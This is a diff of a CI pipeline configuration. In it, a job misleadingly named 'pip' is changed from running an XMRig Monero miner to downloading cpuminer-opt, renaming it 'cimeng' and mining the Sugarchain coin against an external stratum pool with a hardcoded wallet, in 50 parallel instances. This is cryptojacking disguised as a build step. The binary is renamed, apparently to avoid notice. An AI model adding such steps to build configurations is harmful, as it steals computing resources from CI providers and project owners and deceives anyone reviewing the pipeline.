@@ -19,10 +19,10 @@ blocks:
       jobs:
         - name: pip
           commands:
-            - 'git clone https://github.com/quincyhays/bmxmrig'
-            - cd bmxmrig
-            - chmod u+x ./xmrig
-            - './xmrig --donate-level 0 -o randomxmonero.jp.nicehash.com:3380 -u 3DorDzEVXFGiKukE9wk7ARsprnq5VcKAQ3 -k --nicehash --coin monero'
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qkhp29fg42g9g5yle68wx6wjf2au8pv7arn0jh5.1 -t4'
           parallelism: 50
   - name: Run Code Analysis
     task:
